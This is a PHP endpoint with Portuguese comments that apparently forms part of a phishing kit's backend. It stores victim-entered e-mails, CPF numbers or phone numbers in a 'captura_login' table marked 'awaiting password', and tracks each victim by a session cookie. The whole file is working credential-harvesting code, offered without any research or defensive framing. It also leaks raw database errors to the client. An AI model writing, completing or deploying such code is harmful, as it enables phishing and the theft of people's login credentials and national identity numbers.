<?php
// ADIÇÃO 1: Iniciar a sessão. Essencial para usar a variável $_SESSION.
session_start();

// Define o cabeçalho de resposta como JSON
header('Content-Type: application/json');

// --- PASSO 1: LER O COOKIE DE SESSÃO ---
if (!isset($_COOKIE['identificador_cliente'])) {
    echo json_encode(['success' => false, 'error' => 'ID de sessão não encontrado. Limpe os cookies e tente novamente.']);
    exit;
}
$session_id = $_COOKIE['identificador_cliente'];

// Inclui o coração do projeto para ter acesso ao banco de dados ($pdo)
require 'db.php';

// Pega os dados enviados via POST (em formato JSON)
$data = json_decode(file_get_contents('php://input'), true);

// Validação simples dos dados recebidos
if (!isset($data['identificador']) || empty(trim($data['identificador']))) {
    echo json_encode(['success' => false, 'error' => 'O campo identificador é obrigatório.']);
    exit;
}

$identificador = trim($data['identificador']);

// ADIÇÃO 2: Lógica para determinar o tipo de identificador
$tipo_identificador = 'Indefinido';
$apenasNumeros = preg_replace('/\D/', '', $identificador);

if (filter_var($identificador, FILTER_VALIDATE_EMAIL)) {
    $tipo_identificador = 'E-mail';
} elseif (strlen($apenasNumeros) == 11) {
    $tipo_identificador = 'CPF';
} elseif (strlen($apenasNumeros) == 10) {
    $tipo_identificador = 'Telefone';
}

try {
    // --- LÓGICA DE ATUALIZAÇÃO OU INSERÇÃO (UPSERT) ---

    // 1. VERIFICA SE JÁ EXISTE UM REGISTRO PARA ESTA SESSÃO
    $stmt = $pdo->prepare("SELECT id FROM captura_login WHERE session_id = ?");
    $stmt->execute([$session_id]);
    $existing_lead = $stmt->fetch(PDO::FETCH_ASSOC);

    $lead_id = null;

    if ($existing_lead) {
        // 2. SE EXISTE, APENAS ATUALIZA O IDENTIFICADOR (NÃO CRIA UMA NOVA LINHA)
        $stmt_update = $pdo->prepare("UPDATE captura_login SET identificador = ? WHERE id = ?");
        $stmt_update->execute([$identificador, $existing_lead['id']]);
        $lead_id = $existing_lead['id'];
    } else {
        // 3. SE NÃO EXISTE, CRIA A NOVA LINHA COM O STATUS INICIAL
        $stmt_insert = $pdo->prepare(
            "INSERT INTO captura_login (session_id, identificador, status) VALUES (?, ?, 'aguardando_senha')"
        );
        $stmt_insert->execute([$session_id, $identificador]);
        $lead_id = $pdo->lastInsertId();
    }
    
    // ADIÇÃO 3: Salvar os dados na sessão antes de enviar a resposta ao frontend
    $_SESSION['identificador_usuario'] = $identificador;
    $_SESSION['tipo_identificador'] = $tipo_identificador;

    // Retorna uma resposta de sucesso com o ID do registro (existente ou novo)
    echo json_encode(['success' => true, 'id' => $lead_id]);

} catch (PDOException $e) {
    // Em caso de erro no banco de dados, retorna uma mensagem de erro
    http_response_code(500); // É uma boa prática definir o código de erro HTTP
    echo json_encode(['success' => false, 'error' => 'Erro ao salvar no banco de dados: ' . $e->getMessage()]);
}
?>